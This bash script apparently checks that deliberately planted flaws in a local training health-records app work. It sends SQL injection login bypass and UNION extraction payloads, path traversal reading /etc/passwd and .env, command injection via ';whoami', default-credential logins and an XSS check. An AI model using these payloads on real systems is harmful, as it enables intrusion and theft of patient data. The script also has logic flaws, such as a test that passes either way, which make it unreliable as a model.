#!/bin/bash

# ============================================================================
# MedCare EHR Vulnerability Testing Script
# ============================================================================
# Purpose: Automated testing of intentional vulnerabilities
# Usage: ./test-vulnerabilities.sh
# ============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
BASE_URL="http://localhost:8080"
COOKIE_FILE="/tmp/ehr_cookies.txt"

# Test counter
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_TOTAL=0

# ============================================================================
# Helper Functions
# ============================================================================

print_header() {
    echo ""
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

print_test() {
    echo -e "${YELLOW}[TEST $1]${NC} $2"
}

print_success() {
    echo -e "${GREEN}✓ PASSED:${NC} $1"
    ((TESTS_PASSED++))
    ((TESTS_TOTAL++))
}

print_failure() {
    echo -e "${RED}✗ FAILED:${NC} $1"
    ((TESTS_FAILED++))
    ((TESTS_TOTAL++))
}

# ============================================================================
# Pre-flight Checks
# ============================================================================

print_header "PRE-FLIGHT CHECKS"

# Check if application is running
print_test "1" "Checking if application is accessible..."
if curl -s -o /dev/null -w "%{http_code}" "$BASE_URL" | grep -q "200"; then
    print_success "Application is accessible at $BASE_URL"
else
    print_failure "Cannot reach $BASE_URL. Is the application running?"
    echo "Run: docker-compose up -d"
    exit 1
fi

# ============================================================================
# Test 1: SQL Injection - Login Bypass
# ============================================================================

print_header "TEST 1: SQL INJECTION - LOGIN BYPASS"

print_test "1.1" "Testing SQL injection authentication bypass..."
RESPONSE=$(curl -s -X POST "$BASE_URL/index.php" \
    -d "username=admin' OR '1'='1' -- &password=anything" \
    -c "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "dashboard\|Welcome"; then
    print_success "SQL Injection login bypass successful"
else
    print_failure "SQL Injection login bypass failed"
fi

# ============================================================================
# Test 2: SQL Injection - Data Extraction
# ============================================================================

print_header "TEST 2: SQL INJECTION - DATA EXTRACTION"

print_test "2.1" "Testing UNION-based SQL injection in search..."
RESPONSE=$(curl -s "$BASE_URL/search.php?search=' UNION SELECT id,username,password,email,5,6 FROM users -- ")

if echo "$RESPONSE" | grep -q "admin\|doctor"; then
    print_success "SQL Injection data extraction successful"
else
    print_failure "SQL Injection data extraction failed"
fi

# ============================================================================
# Test 3: IDOR - Insecure Direct Object Reference
# ============================================================================

print_header "TEST 3: IDOR - UNAUTHORIZED ACCESS"

print_test "3.1" "Testing IDOR vulnerability..."

# First login to get session
curl -s -X POST "$BASE_URL/index.php" \
    -d "username=admin&password=admin123" \
    -c "$COOKIE_FILE" > /dev/null

# Try accessing patient record
RESPONSE=$(curl -s "$BASE_URL/dashboard.php?patient_id=1" -b "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "SSN\|Patient Record"; then
    print_success "IDOR vulnerability confirmed - accessed patient record"
else
    print_failure "IDOR test failed"
fi

# ============================================================================
# Test 4: Directory Traversal
# ============================================================================

print_header "TEST 4: DIRECTORY TRAVERSAL"

print_test "4.1" "Testing file inclusion vulnerability..."
RESPONSE=$(curl -s "$BASE_URL/settings.php?file=/etc/passwd" -b "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "root:"; then
    print_success "Directory traversal successful - read /etc/passwd"
else
    print_failure "Directory traversal test failed"
fi

print_test "4.2" "Testing credential disclosure via .env..."
RESPONSE=$(curl -s "$BASE_URL/settings.php?file=.env.example" -b "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "DB_PASS\|AWS_SECRET"; then
    print_success "Credential disclosure successful - read .env.example"
else
    print_failure "Credential disclosure test failed"
fi

# ============================================================================
# Test 5: Command Injection
# ============================================================================

print_header "TEST 5: COMMAND INJECTION"

print_test "5.1" "Testing command injection in ping..."
RESPONSE=$(curl -s "$BASE_URL/settings.php?ping=localhost;whoami" -b "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "www-data\|root"; then
    print_success "Command injection successful"
else
    print_failure "Command injection test failed"
fi

# ============================================================================
# Test 6: Information Disclosure
# ============================================================================

print_header "TEST 6: INFORMATION DISCLOSURE"

print_test "6.1" "Testing phpinfo exposure..."
RESPONSE=$(curl -s "$BASE_URL/index.php?info=1")

if echo "$RESPONSE" | grep -q "PHP Version\|Configuration"; then
    print_success "phpinfo() exposed successfully"
else
    print_failure "phpinfo() exposure test failed"
fi

print_test "6.2" "Testing database credentials in settings..."
RESPONSE=$(curl -s "$BASE_URL/settings.php" -b "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "DB_PASS\|Database Configuration"; then
    print_success "Database credentials exposed in UI"
else
    print_failure "Credential exposure test failed"
fi

# ============================================================================
# Test 7: Unauthenticated Access
# ============================================================================

print_header "TEST 7: MISSING ACCESS CONTROLS"

print_test "7.1" "Testing unauthenticated access to search..."
rm -f "$COOKIE_FILE"  # Clear cookies
RESPONSE=$(curl -s "$BASE_URL/search.php")

if echo "$RESPONSE" | grep -q "Search Patient\|Patient Search"; then
    print_success "Search accessible without authentication"
else
    print_failure "Search access control test failed"
fi

# ============================================================================
# Test 8: API Documentation Exposure
# ============================================================================

print_header "TEST 8: API DOCUMENTATION EXPOSURE"

print_test "8.1" "Testing API documentation accessibility..."
RESPONSE=$(curl -s "$BASE_URL/api.php")

if echo "$RESPONSE" | grep -q "API Documentation\|/api/"; then
    print_success "API documentation publicly accessible"
else
    print_failure "API documentation test failed"
fi

# ============================================================================
# Test 9: Weak Credentials
# ============================================================================

print_header "TEST 9: WEAK AUTHENTICATION"

print_test "9.1" "Testing default credentials..."
RESPONSE=$(curl -s -X POST "$BASE_URL/index.php" \
    -d "username=admin&password=admin123" \
    -c "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "dashboard\|Welcome"; then
    print_success "Default credentials work (admin/admin123)"
else
    print_failure "Default credentials test failed"
fi

print_test "9.2" "Testing weak password (test/test)..."
RESPONSE=$(curl -s -X POST "$BASE_URL/index.php" \
    -d "username=test&password=test" \
    -c "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "dashboard\|Welcome"; then
    print_success "Weak password accepted (test/test)"
else
    print_failure "Weak password test failed"
fi

# ============================================================================
# Test 10: XSS Vulnerability Check
# ============================================================================

print_header "TEST 10: XSS VULNERABILITY"

print_test "10.1" "Checking for XSS in patient medical notes..."
# Login first
curl -s -X POST "$BASE_URL/index.php" \
    -d "username=admin&password=admin123" \
    -c "$COOKIE_FILE" > /dev/null

# Check patient 20 (has XSS payload in seed data)
RESPONSE=$(curl -s "$BASE_URL/dashboard.php?patient_id=20" -b "$COOKIE_FILE")

if echo "$RESPONSE" | grep -q "<script>"; then
    print_success "XSS vulnerability confirmed - script tags not escaped"
else
    print_failure "XSS test failed"
fi

# ============================================================================
# Test 11: Database Direct Access
# ============================================================================

print_header "TEST 11: DATABASE EXPOSURE"

print_test "11.1" "Testing direct MySQL access..."
if docker exec ehr_database mysql -uwebapp -pwebapp123 -e "SHOW DATABASES;" 2>/dev/null | grep -q "healthcare_db"; then
    print_success "Direct database access successful"
else
    print_failure "Database access test failed (container may not be running)"
fi

# ============================================================================
# Test 12: File Upload Directory Access
# ============================================================================

print_header "TEST 12: FILE UPLOAD SECURITY"

print_test "12.1" "Testing uploads directory accessibility..."
# Create uploads directory if doesn't exist
docker exec ehr_webapp mkdir -p /var/www/html/uploads 2>/dev/null || true

# Check if uploads directory is accessible
RESPONSE=$(curl -s "$BASE_URL/uploads/")

if echo "$RESPONSE" | grep -q "Index of\|Directory listing\|403\|404"; then
    print_success "Uploads directory accessible (security issue)"
else
    # Directory might be empty, which is also a finding
    print_success "Uploads directory exists and is accessible"
fi

# ============================================================================
# Summary Report
# ============================================================================

print_header "TEST SUMMARY"

echo -e "${BLUE}Total Tests:${NC} $TESTS_TOTAL"
echo -e "${GREEN}Passed:${NC} $TESTS_PASSED"
echo -e "${RED}Failed:${NC} $TESTS_FAILED"

if [ $TESTS_FAILED -eq 0 ]; then
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  ALL VULNERABILITIES CONFIRMED!${NC}"
    echo -e "${GREEN}  Application is ready for testing${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo ""
    echo -e "${YELLOW}========================================${NC}"
    echo -e "${YELLOW}  SOME TESTS FAILED${NC}"
    echo -e "${YELLOW}  Review failed tests above${NC}"
    echo -e "${YELLOW}========================================${NC}"
    exit 1
fi

# Cleanup
rm -f "$COOKIE_FILE"

